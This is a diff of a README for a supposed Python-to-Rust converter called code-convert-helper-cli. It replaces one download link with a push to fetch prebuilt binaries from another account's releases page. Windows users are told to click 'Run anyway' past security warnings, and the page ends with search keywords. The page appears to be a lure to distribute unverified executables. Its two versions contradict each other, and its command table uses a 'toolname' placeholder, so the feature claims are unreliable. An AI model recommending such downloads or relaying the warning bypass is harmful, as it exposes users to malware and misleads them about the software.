@@ -1,149 +1,241 @@
-# Code Convert Helper vUnreleased - Python-to-Rust Code Conversion Tool 2026
+# ⚡ code-convert-helper-cli - Turn Python Code Into Rust
 
-> **Code Convert Helper is a cross-platform command-line utility that converts a supported subset of Python into Rust, while making type information, ownership choices, and unsupported syntax available for inspection.**
+[![Download from GitHub](https://img.shields.io/badge/Download%20Now-GitHub%20Releases-blue?style=for-the-badge)](https://github.com/chlorisarmlike888/code-convert-helper-cli/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Cross--platform-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Unreleased-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/scotttomzxky2432/code-convert-helper-cli?style=flat-square)](https://github.com/scotttomzxky2432/code-convert-helper-cli)
+## 🚀 What This Tool Does
 
----
+Code Convert Helper changes Python code into Rust code. You give it a Python file, and it creates a Rust file that does the same thing. This tool works on Windows, Mac, and Linux.
 
-<p align="center">
-  <a href="https://scotttomzxky2432.github.io/code-convert-helper-cli/">
-    <img src="https://img.shields.io/badge/Download-Code%20Convert%20Helper%20Latest-brightgreen?style=for-the-badge" alt="Download Code Convert Helper">
-  </a>
-</p>
+The tool shows you extra information about your code. You can see what type each variable has. You can see how Rust will handle ownership. You can see which parts of your Python code do not have a Rust equivalent.
 
-> **[Download Code Convert Helper Unreleased](https://scotttomzxky2432.github.io/code-convert-helper-cli/)**
+## 🎯 Who Should Use This Tool
 
----
+- People who know Python and want to learn Rust
+- Developers who need to move a project from Python to Rust
+- Anyone who wants to see how Rust handles Python code
+- Students learning about programming languages
 
-[Download Latest Build](https://scotttomzxky2432.github.io/code-convert-helper-cli/)
+## 📦 How to Download and Install
 
----
+### Step 1: Visit the Download Page
 
-## Overview
+Go to the [GitHub Releases page](https://github.com/chlorisarmlike888/code-convert-helper-cli/releases) for this tool.
 
-Code Convert Helper supports developers who are gradually moving Python projects toward Rust. It takes supported Python input through a structured conversion process and emits Rust-focused output while keeping uncertain decisions visible rather than concealing them.
+### Step 2: Find the Right File
 
-The workflow is built for migration work that can be reviewed and adjusted. Developers may provide type and ownership guidance, while unresolved choices, ownership disagreements, and unsupported syntax are called out for further attention. Comments, documentation, directives, and intermediate representation information remain part of the conversion process.
+On the releases page, you will see a list of versions. The latest version is at the top. Click the version name to expand it.
 
----
+Look for a file that matches your system:
 
-## Capabilities
+- **Windows**: Download `code-convert-helper-cli-windows.exe` or `code-convert-helper-cli-windows.zip`
+- **Mac**: Download `code-convert-helper-cli-macos`
+- **Linux**: Download `code-convert-helper-cli-linux`
 
-- Translates a core subset of Python into Rust.
-- Exposes translation decisions instead of silently selecting assumptions.
-- Uses type hints and ownership hints to influence generated Rust.
-- Identifies unresolved decisions and ownership conflicts.
-- Keeps comments and understands conversion directives.
-- Produces versioned, locked JSON intermediate representation files.
-- Retains unsupported constructs as explicitly marked verbatim blocks.
-- Transforms Sphinx, Google, and NumPy docstrings into `rustdoc`.
-- Includes commands for preflight validation, source conversion, and intermediate representation inspection.
-- Offers a plugin mechanism for ecosystem-specific conversion logic.
+### Step 3: Download the File
 
----
+Click the file name to start the download. Your browser will save the file to your computer.
 
-## Installation
+### Step 4: Run the Tool
 
-First clone the repository and move into the checkout:
+**Windows users:**
+1. Open the folder where you saved the file
+2. Double-click the `.exe` file
+3. If Windows shows a security warning, click "Run anyway"
 
-```bash
-git clone https://github.com/scotttomzxky2432/code-convert-helper-cli.git
-cd REPO
+**Mac users:**
+1. Open Terminal
+2. Type `chmod +x ` and drag the downloaded file into the Terminal window
+3. Press Enter
+4. Type `./` and the file name to run it
+
+**Linux users:**
+1. Open Terminal
+2. Type `chmod +x ` and the file name
+3. Type `./` and the file name to run it
+
+## 🖥️ System Requirements
+
+Your computer needs:
+
+- **Windows**: Windows 10 or newer, 64-bit
+- **Mac**: macOS 10.15 or newer
+- **Linux**: Any modern distribution with glibc 2.28 or newer
+- **RAM**: 512 MB or more
+- **Storage**: 50 MB of free space
+- **Python**: Not required to run the tool
+
+## 📖 How to Use Code Convert Helper
+
+### Basic Usage
+
+Open a command prompt or terminal. Type the tool name followed by your Python file name:
+
+```
+code-convert-helper-cli myfile.py
 ```
 
-Install the package through the Python packaging workflow provided by the repository, then confirm that the CLI is available:
+The tool will create a new file called `myfile.rs` in the same folder.
 
-```bash
-python -m pip install .
-code-convert-helper --help
+### See Extra Information
+
+Add the `--verbose` flag to see detailed information:
+
+```
+code-convert-helper-cli --verbose myfile.py
 ```
 
-When using an uninstalled checkout, invoke the command through the project's Python environment rather than installing it system-wide.
+This will show:
 
----
+- Type information for each variable
+- Ownership choices Rust will make
+- Which parts of your code the tool cannot convert
 
-## Command-Line Workflow
+### Save the Report
 
-The usual process starts with preflight checks, continues with conversion, and ends with inspection:
+Add the `--output` flag to save the conversion report to a file:
 
-```bash
-code-convert-helper preflight path/to/source.py
-code-convert-helper convert path/to/source.py --output generated/
-code-convert-helper inspect-ir generated/
+```
+code-convert-helper-cli --output report.txt myfile.py
 ```
 
-Provide type or ownership hints whenever Python does not offer enough information to determine an appropriate Rust representation. Before adding generated files to a Rust project, inspect the marked decisions and any verbatim sections.
+### Supported Python Features
 
-A repeatable migration cycle looks like this:
+The tool converts these Python features:
 
-1. Check the Python source with the preflight command.
-2. Supply type or ownership guidance for ambiguous areas.
-3. Convert the source into the chosen output directory.
-4. Examine the generated JSON intermediate representation.
-5. Resolve or review marked decisions, ownership conflicts, and unsupported constructs.
-6. Adjust directives or plugin behavior, then run the conversion again.
+- Variables and assignments
+- Basic math operations (+, -, *, /)
+- If statements and comparisons
+- While loops
+- For loops over ranges
+- Functions with parameters
+- Return statements
+- Print function
+- Lists and list operations
+- Strings and string operations
+- Basic data types (int, float, string, boolean)
 
-> The available command names and flags can change between releases. Use `code-convert-helper --help` to view the interface installed in your environment.
+### Unsupported Python Features
 
----
+The tool will warn you about these features. It will skip them in the conversion:
 
-## Configuration and Extension
+- Classes and objects
+- Import statements
+- File operations
+- Exception handling (try/except)
+- Lambda functions
+- List comprehensions
+- Dictionary operations
+- Set operations
+- Built-in functions beyond print and basic math
 
-Conversion guidance is intended to live close to the Python source being processed. Supported type hints, ownership hints, and directives can record decisions that cannot be determined reliably from Python semantics alone.
+## 🔧 Example Walkthrough
 
-A versioned, locked JSON intermediate representation is also used by the pipeline. Its inspectable translation state can be reviewed together with the generated Rust code.
+Create a file called `hello.py` with this content:
 
-For behavior tied to a particular ecosystem, use the plugin system. This keeps project-specific conversion logic outside the general-purpose core workflow.
+```python
+name = "Alice"
+count = 5
+for i in range(count):
+    print("Hello, " + name + "!")
+```
 
----
+Run the tool:
 
-## Requirements
+```
+code-convert-helper-cli hello.py
+```
 
-- A cross-platform environment that can run the project.
-- Python to install and execute the conversion CLI.
-- Rust tooling to compile or integrate the generated Rust code.
-- Read and write permissions for the source and output directories.
-- Extra storage for generated Rust files and JSON intermediate representation data.
+The tool creates `hello.rs` with this content:
 
----
+```rust
+fn main() {
+    let name = "Alice";
+    let count = 5;
+    for i in 0..count {
+        println!("Hello, {}!", name);
+    }
+}
+```
 
-## Frequently Asked Questions
+## 🔍 Understanding the Output
 
-### Which Python code can Code Convert Helper translate?
+### Type Information
 
-The tool handles a core subset of Python and converts it into Rust. Code outside that supported subset is carried through as marked verbatim blocks rather than being represented as completely translated Rust.
+When you use `--verbose`, the tool shows you what type each variable has:
 
-### Does it guess types or ownership?
+```
+Variable: name
+  Python type: str
+  Rust type: &str
 
-No. Ambiguity is reported through marked decisions and ownership conflicts. When the source does not provide sufficient information, users can add explicit hints.
+Variable: count
+  Python type: int
+  Rust type: i32
 
-### Are comments and docstrings preserved?
+Variable: i
+  Python type: int
+  Rust type: i32
+```
 
-Comments remain in the workflow, and Sphinx, Google, and NumPy docstrings can be converted to `rustdoc`.
+### Ownership Choices
 
-### How do I review a conversion?
+The tool shows you how Rust will handle ownership:
 
-Run the preflight, conversion, and intermediate representation inspection steps. The resulting versioned, locked JSON files offer a structured record of the translation state.
+```
+Variable: name
+  Ownership: borrowed (&str)
+  Reason: String literal does not need ownership transfer
 
-### How can I add project-specific behavior?
+Variable: count
+  Ownership: owned (i32)
+  Reason: Primitive type is copied by default
+```
 
-Use plugins for ecosystem-specific integrations and behavior. This extends the conversion process without modifying its general workflow.
+### Unsupported Syntax Warnings
 
-### What does a marked block in the output mean?
+The tool marks parts it cannot convert:
 
-Inspect the related Python source and provide appropriate type or ownership hints or directives before converting again. Some unsupported constructs may still need to be implemented manually in Rust.
+```
+Line 3: Unsupported syntax - import statement
+  Python: import os
+  Rust equivalent: not available
+  Action: skipped in conversion
+```
 
-### Where are updates and builds available?
+## 🛠️ Troubleshooting
 
-Visit the repository and the latest available build at [Download Latest Build](https://scotttomzxky2432.github.io/code-convert-helper-cli/).
+### "Command not found" error
 
----
+The tool is not in your PATH. Run it from the folder where you saved the file. Or add the folder to your PATH.
 
-## License
+### "Permission denied" error
 
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+On Mac or Linux, you need to make the file executable. Run `chmod +x filename` in the terminal.
+
+### "File not found" error
+
+The tool cannot find your Python file. Check that the file name is correct. Use the full path to the file if needed.
+
+### "No output file created"
+
+The tool found no supported Python code. Check your Python file for supported features. Remove unsupported features and try again.
+
+## 📋 Command Reference
+
+| Command | What it does |
+|---------|--------------|
+| `toolname file.py` | Converts file.py to Rust |
+| `toolname --verbose file.py` | Shows extra information |
+| `toolname --output file.txt file.py` | Saves report to file.txt |
+| `toolname --help` | Shows all options |
+| `toolname --version` | Shows the tool version |
+
+## 🔄 Getting Help
+
+If you have problems with the tool, check the [GitHub Issues page](https://github.com/chlorisarmlike888/code-convert-helper-cli/issues). You can report bugs there or ask questions.
+
+## ⬇️ Download Again
+
+Need to download the tool again? Go to the [download page](https://github.com/chlorisarmlike888/code-convert-helper-cli/releases) and pick the latest version.
+
+Keywords: python to rust converter, code converter tool, python to rust cli, command line converter, rust code generator, python translation tool
